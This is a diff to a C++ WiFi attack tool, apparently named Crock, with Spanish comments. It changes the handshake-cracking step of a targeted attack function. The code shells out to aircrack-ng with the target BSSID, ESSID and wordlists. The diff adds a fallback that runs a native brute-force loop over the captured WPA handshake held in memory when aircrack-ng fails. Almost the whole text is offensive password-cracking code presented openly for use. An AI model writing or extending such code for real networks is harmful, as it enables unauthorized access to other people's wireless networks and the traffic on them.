@@ -416,17 +416,41 @@ void Crock::targeted_attack(const std::string &bssid, const std::vector<std::str
 
     // ── 6. Crack con aircrack-ng ─────────────────────────────────────────────
     keep_running = true;
-    std::printf("\n[+] Cracking WPA Handshake:\n");
+    std::printf("\n[+] Cracking WPA Handshake (Aircrack-ng Engine):\n");
     bool cracked = false;
     for (const auto &dict : wordlists) {
         std::printf("[*] Running aircrack-ng with %s\n", dict.c_str());
         // Forzamos el ESSID exacto con -e por si no se capturó el beacon
         std::string crack = "aircrack-ng -b " + bssid + " -e \"" + ssid_local + "\" -w \"" + dict + "\" " + save_path;
+        // Wifite y aircrack normalmente devuelven 0 si crackean y 1 si fallan.
         if (std::system(crack.c_str()) == 0) {
             cracked = true;
             break;
         }
     }
+    
+    // Fallback: Si aircrack falla (ej. si no reconoció los paquetes EAPOL en el .cap),
+    // forzamos nuestra función local escrita en C++ usando la info en memoria.
+    if (!cracked) {
+        std::printf("[!] \033[1;31mAircrack-ng falló o no pudo procesar la captura.\033[0m\n");
+        std::printf("\033[1;33m[!] INICIANDO MOTOR DE FUERZA BRUTA NATIVO (CROCK ENGINE)...\033[0m\n");
+        
+        HandshakeData hs;
+        {
+            std::lock_guard<std::mutex> lock(targets_mtx);
+            hs = targets[bssid].handshake;
+        }
+        
+        if (hs.complete) {
+            crack_loop(bssid, hs, ssid_local, wordlists);
+            if (global_status.cracked) {
+                cracked = true;
+            }
+        } else {
+            std::printf("[!] \033[1;31mEl motor nativo no tiene un handshake completo en memoria.\033[0m\n");
+        }
+    }
+
     if (!cracked) {
         std::printf("[!] \033[1;31mFailed to crack: password not in wordlist(s) or bad capture.\033[0m\n");
     }
